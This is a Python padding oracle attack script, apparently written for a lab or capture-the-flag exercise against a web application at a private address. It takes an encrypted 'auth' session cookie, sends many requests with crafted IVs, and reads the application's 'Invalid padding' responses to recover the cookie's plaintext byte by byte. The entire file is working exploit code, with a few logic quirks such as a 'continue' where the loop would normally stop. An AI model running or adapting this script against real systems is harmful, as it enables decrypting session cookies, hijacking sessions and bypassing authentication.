import requests
from urllib.parse import quote,unquote
import base64
import codecs

import binascii
url = "http://10.0.0.131/index.php"
original_cookie = 'UDyGBNMcBw9dmPdSs3lq9%2F3j9ZTdwcvM'
plantext = []

#convert raw cookie to  hex
def cookieToHex(cookValue):
    cookValue = unquote(cookValue) #urlDecode
    cookValue = base64.b64decode(cookValue)  #decode base64
    cookValue = cookValue.hex()  #convert to hex value
    return cookValue;

#from payload hex convert to cookie format
def buildCookie(cookValue):
    newcooke = base64.b64encode(cookValue) #convert hex to string and endcode to base64
    newcooke = quote(newcooke,safe='') # urlencode cookie
    return newcooke;

#Make new cookie and get each value of decrypted Cookie
def sendRequest(payload):
    cookie = dict(auth=payload)
    r = requests.get(url, cookies=cookie)
    if 'Invalid padding' in r.text:
        return True
    else:
        return False


# Main : decrypt cookie
def getDecryptedBlock(cookValue):
    cookValue = cookieToHex(cookValue);
    #split each 8 byte for each block
    blocks = [cookValue[i:i+16] for i in range(0, len(cookValue), 16)]
    original_block = []
    #save each decoded block to list
    for b in blocks:
        original_block.append(bytes.fromhex(b))
    #del original_block[-1]
    # run loop in 2 blocks: block 2 và 3 bỏ qua 1
    for i in range(1,-1,-1):
        # set tail of iv for each block be empty
        decrypted = []
        tailIv = b''

        # loop in 8 bytes of a block
        for j in range(1,9):
            #brute force 256 char for each padding
            for k in range(256):
                #generate iv : number zero byte + char at index payload + tail of iv
                newIv = b'0' * (8 - j) + bytes([k]) + tailIv
                payload = buildCookie(newIv+original_block[-1])
                result = sendRequest(payload)
                # if not invalid padding up to 1 for tail of pading, save decryted text into secret
                if not result:
                    print ("true padding:" + str(k) +"-"+ str(newIv) +"-" +(cookieToHex(payload)))
                    curDecryptChr = k^j
                    decrypted.insert(0,curDecryptChr);
                    plantext.insert(0,chr(curDecryptChr^original_block[i][8-j]))
                    temp = decrypted.copy()
                    #make new tail for next pad
                    for u in range(len(temp)):
                        temp[u] = (j+1) ^ temp[u]
                    tailIv = bytes(temp)
                    continue
        # delete each last block after complete atack this block
        del original_block[-1]
        print(decrypted)
getDecryptedBlock(original_cookie)
print (plantext)
# print(cookieToHex('Ieg%2Bsq%2FFuciyXlVi%2FI1EYh6C%2BwSK35OW'))
